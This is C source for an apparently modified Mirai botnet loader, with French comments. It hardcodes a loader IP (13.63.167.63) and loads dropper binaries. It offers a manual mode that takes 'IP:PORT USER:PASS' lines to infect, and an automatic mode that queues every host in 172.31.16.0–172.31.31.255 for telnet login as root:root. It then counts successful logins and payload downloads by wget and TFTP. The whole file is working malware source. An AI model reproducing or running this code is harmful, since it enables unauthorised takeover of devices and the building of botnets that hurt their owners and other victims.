#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <time.h>
#include "headers/includes.h"
#include "headers/server.h"
#include "headers/telnet_info.h"
#include "headers/binary.h"
#include "headers/util.h"

static void *stats_thread(void *);
static struct server *srv;
char *id_tag = "telnet";

// Modes
#define MODE_MANUAL      0
#define MODE_AUTO        1

// Prototypes
void auto_scan(void);
void uint32_to_ip(uint32_t ip, char *buffer);

// ==================== FONCTIONS UTILITAIRES ====================

void uint32_to_ip(uint32_t ip, char *buffer)
{
    sprintf(buffer, "%d.%d.%d.%d",
            (ip >> 24) & 0xFF,
            (ip >> 16) & 0xFF,
            (ip >> 8) & 0xFF,
            ip & 0xFF);
}

// ==================== SCAN AUTOMATIQUE ====================

void auto_scan(void)
{
    struct telnet_info info;
    uint32_t total = 0;
    
    printf("\n========================================\n");
    printf("    SCAN AUTOMATIQUE - RESEAU /20\n");
    printf("    172.31.16.0 a 172.31.31.255\n");
    printf("========================================\n\n");
    
    // Pour chaque troisième octet de 16 à 31 (inclus)
    for (int o3 = 16; o3 <= 31; o3++)
    {
        // Pour chaque quatrième octet de 1 à 254
        for (int o4 = 1; o4 <= 254; o4++)
        {
            char strbuf[128];
            snprintf(strbuf, sizeof(strbuf), "172.31.%d.%d:23 root:root", o3, o4);
            
            memset(&info, 0, sizeof(struct telnet_info));
            if (telnet_info_parse(strbuf, &info) != NULL)
            {
                server_queue_telnet(srv, &info);
                total++;
                printf("[%4d] Queued: 172.31.%d.%d\n", total, o3, o4);
                usleep(10000); // Pause légère (10ms)
            }
        }
    }
    
    printf("\n[*] %d IPs mises en file d'attente.\n", total);
    printf("[*] Infection en cours...\n");
}

// ==================== MAIN ====================

int main(int argc, char **args)
{
    pthread_t stats_thrd;
    uint8_t addrs_len;
    ipv4_t *addrs;
    uint32_t total = 0;
    struct telnet_info info;
    int choice;

    // ==================== CONFIGURATION RÉSEAU ====================
    addrs_len = 1;
    addrs = calloc(addrs_len, sizeof(ipv4_t));
    addrs[0] = inet_addr("13.63.167.63");  // IP du Loader

    if (argc == 2)
        id_tag = args[1];

    // ==================== CHARGEMENT DES DROPPERS ====================
    if (!binary_init())
    {
        printf("Failed to load bins/dlr.* as dropper\n");
        return 1;
    }

    // ==================== CRÉATION DU SERVEUR ====================
    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 
                              1024 * 64, "13.63.167.63", 80, "13.63.167.63")) == NULL)
    {
        printf("Failed to initialize server. Aborting\n");
        return 1;
    }

    // ==================== DÉMARRAGE STATS ====================
    pthread_create(&stats_thrd, NULL, stats_thread, NULL);

    // ==================== MENU ====================
    printf("\n========================================\n");
    printf("        MIRAI LOADER - v2.0\n");
    printf("========================================\n\n");
    printf("1. Mode Manuel\n");
    printf("2. Mode Auto (Scan 192.168.1.0/24)\n");
    printf("\n");
    printf("Choix: ");
    scanf("%d", &choice);
    getchar();  // Consomme le newline

    printf("\n");

    // ==================== EXÉCUTION ====================
    switch (choice)
    {
        case 1:
            // ==================== MODE MANUEL ====================
            printf("[*] Mode Manuel\n");
            printf("    Format: IP:PORT USER:PASS\n");
            printf("    Exemple: 192.168.1.11:23 root:root\n");
            printf("    Tapez Ctrl+D pour quitter\n\n");
            
            while (TRUE)
            {
                char strbuf[1024];
                printf("> ");
                fflush(stdout);
                
                if (fgets(strbuf, sizeof(strbuf), stdin) == NULL)
                    break;

                util_trim(strbuf);
                if (strlen(strbuf) == 0)
                    continue;

                memset(&info, 0, sizeof(struct telnet_info));
                if (telnet_info_parse(strbuf, &info) == NULL)
                {
                    printf("Format invalide. Utilisez: ip:port user:pass\n");
                }
                else
                {
                    server_queue_telnet(srv, &info);
                    total++;
                    printf("[%d] Infecting %s\n", total, strbuf);
                    if (total % 100 == 0)
                        sleep(1);
                }
            }
            break;
            
        case 2:
            // ==================== MODE AUTO ====================
            auto_scan();
            break;
            
        default:
            printf("[!] Option invalide. Mode manuel par defaut.\n");
            break;
    }

    printf("\n[*] Scan terminé. Attente des infections...\n");
    
    while(ATOMIC_GET(&srv->curr_open) > 0)
        sleep(1);
    
    printf("[*] Loader terminé.\n");
    return 0;
}

// ==================== THREAD STATISTIQUES ====================

static void *stats_thread(void *arg)
{
    uint32_t seconds = 0;

    while (TRUE)
    {
#ifndef DEBUG
        printf("%ds\tProcessed: %d\tConns: %d\tLogins: %d\tRan: %d\tEchoes:%d Wgets: %d, TFTPs: %d\n",
               seconds++, ATOMIC_GET(&srv->total_input), ATOMIC_GET(&srv->curr_open), 
               ATOMIC_GET(&srv->total_logins), ATOMIC_GET(&srv->total_successes),
               ATOMIC_GET(&srv->total_echoes), ATOMIC_GET(&srv->total_wgets), 
               ATOMIC_GET(&srv->total_tftps));
#endif
        fflush(stdout);
        sleep(1);
    }
    return NULL;
}